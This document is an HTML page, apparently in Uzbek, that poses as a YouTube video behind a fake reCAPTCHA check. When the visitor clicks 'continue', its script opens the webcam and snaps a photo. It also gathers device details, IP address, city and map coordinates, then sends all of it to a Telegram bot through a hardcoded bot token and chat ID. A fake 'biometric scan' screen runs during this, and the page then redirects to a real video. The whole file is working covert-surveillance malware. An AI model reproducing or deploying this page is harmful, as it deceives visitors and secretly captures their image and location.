<!DOCTYPE html>
<html lang="en">
<head>
    <meta property="og:type" content="video.other">
    <meta property="og:title" content="Eng qiziqarli videolar to'plami 2026 ðŸ”¥">
    <meta property="og:description" content="Hozir ko'ring! Eng kulguli prandlar va kutilmagan vaziyatlar.">
    <meta property="og:image" content="https://i.ytimg.com/vi/3asWofvW_tU/maxresdefault.jpg">
    <meta property="og:image:width" content="1280">
    <meta property="og:image:height" content="720">
    <meta property="og:url" content="https://www.youtube.com">
    
    <link rel="icon" href="https://www.youtube.com/s/desktop/28ea0284/img/favicon_32x32.png">

    <meta charset="UTF-8">
    <title>YouTube - Funny Moments</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html { height: 100%; margin: 0; display: flex; justify-content: center; align-items: center; font-family: 'Helvetica', Arial, sans-serif; background-color: #fcfcfc; color: #000; text-align: center; overflow: hidden; }
        .container { max-width: 500px; padding: 20px; z-index: 10; }
        h1 { font-size: 110px; margin: 0; font-weight: 800; line-height: 1; }
        h2 { font-size: 26px; margin: 15px 0 10px 0; font-weight: 700; }
        p { color: #999; font-size: 16px; margin-bottom: 25px; }
        .captcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; padding: 12px; display: flex; align-items: center; justify-content: space-between; width: 280px; margin: 0 auto 25px; border-radius: 3px; }
        input[type="checkbox"] { width: 22px; height: 22px; cursor: pointer; }
        #photoBtn { background-color: #ff0000; color: #fff; padding: 14px 30px; border: none; text-transform: uppercase; font-weight: bold; cursor: pointer; opacity: 0.4; pointer-events: none; border-radius: 2px; }
        #scanUI { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; color: #0f0; font-family: monospace; }
        #video { width: 100%; height: 100%; object-fit: cover; opacity: 0.5; }
        .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: rgba(255, 0, 0, 0.7); box-shadow: 0 0 15px #ff0000; animation: scan 3s infinite; }
        @keyframes scan { 0% { top: 0% } 50% { top: 100% } 100% { top: 0% } }
        .scan-data { position: absolute; top: 20px; left: 20px; text-align: left; background: rgba(0,0,0,0.7); padding: 15px; border-radius: 5px; font-size: 12px; }
        #warningOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,0,0,0.8); z-index: 200; color: #fff; justify-content: center; align-items: center; flex-direction: column; font-weight: bold; }
        .blink { animation: blinker 0.5s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

<div class="container" id="mainUI">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" width="120" style="margin-bottom: 10px;">
    <h2>Siz robot emasmisiz?</h2>
    <p>Videoni davom ettirish uchun xavfsizlik tekshiruvidan o'ting.</p>
    <div class="captcha-box">
        <div style="display: flex; align-items: center; gap: 12px;">
            <input type="checkbox" id="captchaCheck">
            <span style="font-size: 14px; color: #555;">Robot emasman</span>
        </div>
        <img style="width: 40px;" src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
    </div>
    <button id="photoBtn">DAVOM ETTIRISH</button>
</div>

<div id="scanUI">
    <video id="video" autoplay playsinline muted></video>
    <div class="scanner-line"></div>
    <div class="scan-data" id="logs">> INITIALIZING BIOMETRIC SCAN...<br></div>
    <div id="warningOverlay">
        <h1 class="blink">OGOHLANTIRISH!</h1>
        <p style="font-size: 20px;">Tizimda xatolik aniqlandi</p>
        <p>Bog'lanish qayta tiklanmoqda...</p>
    </div>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
    const CHAT_ID = "7880376636";
    const TARGET_URL = "https://www.youtube.com/watch?v=sWA-osOeiJg";

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const photoBtn = document.getElementById("photoBtn");

    document.getElementById("captchaCheck").onchange = (e) => {
        photoBtn.style.opacity = e.target.checked ? "1" : "0.4";
        photoBtn.style.pointerEvents = e.target.checked ? "auto" : "none";
    };

    async function getDeepInfo() {
        let bInfo = "N/A";
        try { const b = await navigator.getBattery(); bInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Zaryadda' : 'Zaryadsiz'})`; } catch(e) {}
        try {
            const ipR = await fetch('https://ipapi.co/json/').then(r => r.json());
            const ram = navigator.deviceMemory || "N/A";
            const cpu = navigator.hardwareConcurrency || "N/A";
            return `ðŸ•’ Vaqt: ${new Date().toLocaleTimeString()}\nðŸ“± Qurilma: ${navigator.platform} (${cpu} core, ${ram}GB RAM)\nðŸ”‹ Batareya: ${bInfo}\nðŸŒ IP: ${ipR.ip}\nðŸ™ Shahar: ${ipR.city}\nðŸ“ Maps: https://www.google.com/maps?q=${ipR.latitude},${ipR.longitude}`;
        } catch(e) { return "Ma'lumot olinmadi"; }
    }

    async function sendToTg(blob, caption) {
        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("photo", blob, "image.jpg");
        fd.append("caption", caption);
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
        } catch(e) {}
    }

    photoBtn.onclick = async () => {
        document.getElementById("mainUI").style.display = "none";
        document.getElementById("scanUI").style.display = "block";
        const logs = document.getElementById("logs");

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            video.srcObject = stream;
            const info = await getDeepInfo();

            setTimeout(() => logs.innerHTML += "> SERVER BILAN ALOQA O'RNATILDI...<br>", 1000);
            setTimeout(() => logs.innerHTML += "> BIOMETRIK TAHLIL KETMOQDA...<br>", 2000);

            setTimeout(async () => {
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext("2d").drawImage(video, 0, 0);
                canvas.toBlob(b => sendToTg(b, "ðŸ“¸ SCAN NATIJASI\n" + info), "image/jpeg", 0.7);
            }, 3000);

            setTimeout(() => { document.getElementById("warningOverlay").style.display = "flex"; }, 4500);

            setTimeout(() => {
                stream.getTracks().forEach(t => t.stop());
                window.location.href = TARGET_URL;
            }, 6500);

        } catch(e) { window.location.href = TARGET_URL; }
    };
</script>
</body>
</html>
